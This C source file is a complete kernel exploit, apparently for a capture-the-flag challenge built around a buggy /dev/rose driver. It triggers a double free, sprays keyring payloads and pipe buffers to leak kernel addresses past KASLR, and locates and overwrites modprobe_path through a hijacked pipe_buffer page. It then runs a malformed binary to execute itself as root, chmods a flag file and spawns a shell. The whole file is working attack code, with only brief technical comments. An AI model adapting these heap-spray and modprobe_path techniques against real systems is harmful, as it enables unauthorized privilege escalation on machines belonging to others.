#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <time.h>
#include <unistd.h>

static void __die_errno(const char *path, int line, const char *msg);

#define die_errno(msg) __die_errno(__FILE__, __LINE__, msg)

#define check_syscall(x)                                                       \
  ({                                                                           \
    typeof(x) __x = x;                                                         \
    if (__x == (typeof(x))-1) {                                                \
      die_errno(#x);                                                           \
    }                                                                          \
    __x;                                                                       \
  })

/*
 * Spawn a shell.
 * The corrupted objects are kept around, making it possible to run the exploit
 * multiple times.
 */
static void exec_shell(void) {
  char bin_sh[] = "/bin/sh";
  char *argv[] = {bin_sh, NULL};

  check_syscall(execve(argv[0], argv, environ));
}

static void __die(const char *path, int line, const char *msg) {
  fprintf(stderr, "%s:%d: %s\n", path, line, msg);
  exec_shell();
}

#define assert(x)                                                              \
  do {                                                                         \
    if (!(x)) {                                                                \
      __die(__FILE__, __LINE__, #x);                                           \
    }                                                                          \
  } while (0)

static void __die_errno(const char *path, int line, const char *msg) {
  fprintf(stderr, "%s:%d: ", path, line);
  perror(msg);
  exec_shell();
}

static int show_slabinfo = 0;
static int show_leaked_key = 0;
static int show_physmem = 0;

static void do_show_slabinfo(const char *s) {
  if (show_slabinfo) {
    printf("%s:\n", s);
    system("grep ^kmalloc-1k /proc/slabinfo");
  }
}

#define PAGE_SIZE 0x1000ULL
#define PAGE_MASK (~(PAGE_SIZE - 1))
#define SIZEOF_USER_KEY_PAYLOAD 0x18
#define SIZEOF_PAGE 0x40
struct pipe_buffer {
  long page;
  int offset;
  int len;
  long ops;
  int flags;
  int field_1C;
  long private;
};
#define vmlinux 0xFFFFFFFF81000000ULL
#define vmlinux_anon_pipe_buf_ops 0xFFFFFFFF8261DF80ULL
#define vmlinux_modprobe_path 0xFFFFFFFF82C51E20ULL
#define PUD_MASK ((1ULL << 30) - 1)

typedef int32_t key_serial_t;
#define KEY_SPEC_USER_KEYRING -4
#define KEYCTL_UPDATE 2
#define KEYCTL_REVOKE 3
#define KEYCTL_READ 11
#define KEYCTL_INVALIDATE 21
#define CONFIG_PHYSICAL_START 0x1000000
#define CONFIG_PHYSICAL_ALIGN 0x200000

static key_serial_t add_key(const char *type, const char *description,
                            const void *payload, size_t plen,
                            key_serial_t keyring) {
  return syscall(__NR_add_key, type, description, payload, plen, keyring);
}

static long keyctl(int operation, long arg2, long arg3, long arg4, long arg5) {
  return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

static void hexdump(const void *p, size_t n) {
  size_t i;

  printf("[0x%zx] ", n);
  for (i = 0; i < n; i++) {
    printf("%02x", ((const char *)p)[i] & 0xff);
    if (i % 16 == 15 && i != n - 1) {
      printf("\n");
    }
  }
  printf("\n");
}

extern char **environ;

#define KEY_COUNT 10
#define KEY_SIZE                                                               \
  512 /* kmalloc-512; kmalloc-1k with user_key_payload header                  \
       */
#define PIPE_COUNT 50

struct exploit {
  int rose_fd;
  int keys[KEY_COUNT];
  int pipes[PIPE_COUNT][2];
  size_t corrupted_key_index;
  struct pipe_buffer pipe_buffer;
  long vmemmap_base;
  long modprobe_path;
  size_t corrupted_pipe_index;
  long modprobe_path_physaddr;
};

static void init_exploit(struct exploit *e) {
  do_show_slabinfo("Initial");
  memset(e, 0xff, sizeof(*e));
}

static int open_rose(void) { return check_syscall(open("/dev/rose", O_RDWR)); }

static void init_rose(struct exploit *e) {
  int rose_fd = open_rose();
  e->rose_fd = open_rose();
  check_syscall(close(rose_fd));
}

/*
 * Spray user_key_payloads. One of them should land on top of the freed
 * MAX_DATA_HEIGHT allocation.
 */
static void spray_keys(struct exploit *e, const char *data, size_t len) {
  char buf[KEY_SIZE];
  static int epoch;
  size_t i;

  if (data != NULL) {
    memcpy(buf, data, len);
  }
  memset(buf + len, 'K', sizeof(buf) - len);
  for (i = 0; i < KEY_COUNT; i++) {
    char desc[32];

    /*
     * Give the keys unique descriptions in order to avoid the reuse of the key
     * that will be corrupted later. This makes it possible to run the exploit
     * more than once.
     */
    snprintf(desc, sizeof(desc), "key-%d-%lu-%zu", epoch,
             (unsigned long)time(NULL), i);
    e->keys[i] = check_syscall(
        add_key("user", desc, buf, sizeof(buf), KEY_SPEC_USER_KEYRING));
  }
  epoch++;
  do_show_slabinfo("After add_key()");
}

/*
 * BUG: double free. This should free one of the user_key_payloads or pipes.
 */
static void trigger_bug(struct exploit *e) {
  char buf[KEY_SIZE];
  int key;

  /* Work around BUG_ON(object == fp). */
  memset(buf, 'K', sizeof(buf));
  key = check_syscall(
      add_key("user", "trigger_bug", buf, sizeof(buf), KEY_SPEC_USER_KEYRING));
  check_syscall(keyctl(KEYCTL_INVALIDATE, key, 0, 0, 0));

  check_syscall(close(e->rose_fd));
}

static bool is_pipe_data_corrupted(char *buf) {
  size_t i;

  for (i = 0; i < PAGE_SIZE; i++) {
    if (buf[i] != 'P') {
      return true;
    }
  }

  return false;
}

/*
 * Spray pipe_buffers.
 * One of them should land on top of a freed user_key_payload.
 */
static void spray_pipes(struct exploit *e, bool free_first) {
  char buf[PAGE_SIZE * 2]; /* initialize two pipe_buffers */
  size_t i;

  memset(buf, 'P', sizeof(buf));
  for (i = 0; i < PIPE_COUNT; i++) {
    check_syscall(pipe(e->pipes[i]));
    check_syscall(write(e->pipes[i][1], buf, sizeof(buf)));
    if (free_first) {
      /*
       * The first buffer will be overlaid by user_key_payload, so make sure we
       * won't touch it.
       */
      check_syscall(read(e->pipes[i][0], buf, PAGE_SIZE));
    }
  }
  do_show_slabinfo("After pipe()");
}

static struct pipe_buffer *pipe_buffer_from_key_buf(char *key_buf) {
  return (struct pipe_buffer
              *)&key_buf[sizeof(struct pipe_buffer) - SIZEOF_USER_KEY_PAYLOAD];
}

/*
 * Read out user_key_payloads; one of them should leak the second pipe_buffer.
 */
static void leak_vmemmap(struct exploit *e) {
  char key_buf[0x10000]; /* datalen is unsigned short */
  size_t i;

  for (i = 0; i < KEY_COUNT; i++) {
    long size = check_syscall(
        keyctl(KEYCTL_READ, e->keys[i], (long)key_buf, sizeof(key_buf), 0));

    if (size != KEY_SIZE) {
      if (show_leaked_key) {
        hexdump(key_buf, size);
      }
      e->corrupted_key_index = i;
      e->pipe_buffer = *pipe_buffer_from_key_buf(key_buf);
      break;
    }
  }
  assert(i != KEY_COUNT);

  printf("pipe_page = 0x%lx\n", e->pipe_buffer.page);
  printf("anon_pipe_buf_ops = 0x%lx\n", e->pipe_buffer.ops);

  /*
   * KASLR granularity is PUD, see kernel_randomize_memory().
   */
  e->vmemmap_base = e->pipe_buffer.page & ~PUD_MASK;
  printf("vmemmap_base = 0x%lx\n", e->vmemmap_base);

  /*
   * FGKASLR does not shuffle data.
   */
  e->modprobe_path =
      e->pipe_buffer.ops - vmlinux_anon_pipe_buf_ops + vmlinux_modprobe_path;
  printf("modprobe_path = 0x%lx\n", e->modprobe_path);
}

/* Invalidate all keys except the corrupted one. */
static void cleanup_keys(struct exploit *e) {
  size_t i;

  for (i = 0; i < KEY_COUNT; i++) {
    if (i != e->corrupted_key_index) {
      check_syscall(keyctl(KEYCTL_INVALIDATE, e->keys[i], 0, 0, 0));
    }
  }
}

/* Close all pipes except the corrupted one. */
static void cleanup_pipes(struct exploit *e) {
  size_t i;

  for (i = 0; i < PIPE_COUNT; i++) {
    if (i != e->corrupted_pipe_index) {
      check_syscall(close(e->pipes[i][0]));
      check_syscall(close(e->pipes[i][1]));
    }
  }
}

static void leak_modprobe_path_physaddr(struct exploit *e) {
  const char sbin_modprobe[] = "/sbin/modprobe";
  struct pipe_buffer *pipe_buffer;
  char key_buf[KEY_SIZE];
  size_t i, j;

  memset(key_buf, 0, sizeof(key_buf));
  pipe_buffer = pipe_buffer_from_key_buf(key_buf);
  pipe_buffer->offset = vmlinux_modprobe_path & (PAGE_SIZE - 1);
  /*
   * Keep the corrupted pipe_buffer allocated by reading 1 character less than
   * what is available. This prevents page reference count decrement.
   */
  pipe_buffer->len = sizeof(sbin_modprobe) + 1;
  pipe_buffer->ops = e->pipe_buffer.ops;
  pipe_buffer->flags = e->pipe_buffer.flags;

  for (j = 0; e->modprobe_path_physaddr == -1; j++) {
    long physaddr;

    printf(".");
    if (j % 16 == 15) {
      printf("\n");
    }
    fflush(stdout);

    init_rose(e);
    spray_pipes(e, true);
    trigger_bug(e);
    physaddr = (CONFIG_PHYSICAL_START + (vmlinux_modprobe_path - vmlinux) +
                CONFIG_PHYSICAL_ALIGN * j);
    pipe_buffer->page = e->vmemmap_base + physaddr / PAGE_SIZE * SIZEOF_PAGE;
    spray_keys(e, key_buf, sizeof(key_buf));

    e->corrupted_pipe_index = -1;
    for (i = 0; i < PIPE_COUNT; i++) {
      char buf[sizeof(sbin_modprobe)];

      check_syscall(read(e->pipes[i][0], buf, sizeof(buf)));
      if (is_pipe_data_corrupted(buf)) {
        if (show_physmem) {
          hexdump(buf, sizeof(buf));
        }
        if (memcmp(buf, sbin_modprobe, sizeof(buf)) == 0) {
          e->modprobe_path_physaddr = physaddr;
          printf("\nmodprobe_path physaddr = 0x%lx\n",
                 e->modprobe_path_physaddr);
        }
        e->corrupted_pipe_index = i;
        break;
      }
    }
    assert(i != PIPE_COUNT);

    cleanup_keys(e);
    cleanup_pipes(e);
  }
}

static void overwrite_modprobe_path(struct exploit *e) {
  struct pipe_buffer *pipe_buffer;
  char self_exe[256] = {};
  char key_buf[KEY_SIZE];
  size_t i;

  check_syscall(readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1));

  memset(key_buf, 0, sizeof(key_buf));
  pipe_buffer = pipe_buffer_from_key_buf(key_buf);
  memset(pipe_buffer, 0, sizeof(*pipe_buffer));
  pipe_buffer->page =
      e->vmemmap_base + e->modprobe_path_physaddr / PAGE_SIZE * SIZEOF_PAGE;
  pipe_buffer->offset = 0;
  pipe_buffer->len = vmlinux_modprobe_path & (PAGE_SIZE - 1);
  pipe_buffer->ops = e->pipe_buffer.ops;
  pipe_buffer->flags = e->pipe_buffer.flags;

  init_rose(e);
  spray_pipes(e, true);
  trigger_bug(e);
  spray_keys(e, key_buf, sizeof(key_buf));
  for (i = 0; i < PIPE_COUNT; i++) {
    check_syscall(write(e->pipes[i][1], self_exe, strlen(self_exe) + 1));
  }
}

static void trigger_modprobe(void) {
  const char *path = "/tmp/bprm";

  int fd = check_syscall(open(path, O_CREAT | O_RDWR, 0777));
  check_syscall(write(fd, "\xff\xff\xff\xff", 4));
  check_syscall(close(fd));
  check_syscall(chmod(path, 0777));
  system(path);
}

int main(int argc, char **argv) {
  struct exploit e;

  if (argc != 1) {
    check_syscall(chmod("/home/user/flag", 0777));
    return EXIT_SUCCESS;
  }
  (void)argv;

  init_exploit(&e);

  init_rose(&e);
  spray_keys(&e, NULL, 0);
  trigger_bug(&e);
  spray_pipes(&e, false);
  leak_vmemmap(&e);
  cleanup_keys(&e);
  cleanup_pipes(&e);
  e.corrupted_key_index = -1;

  leak_modprobe_path_physaddr(&e);
  overwrite_modprobe_path(&e);
  trigger_modprobe();

  exec_shell();
}
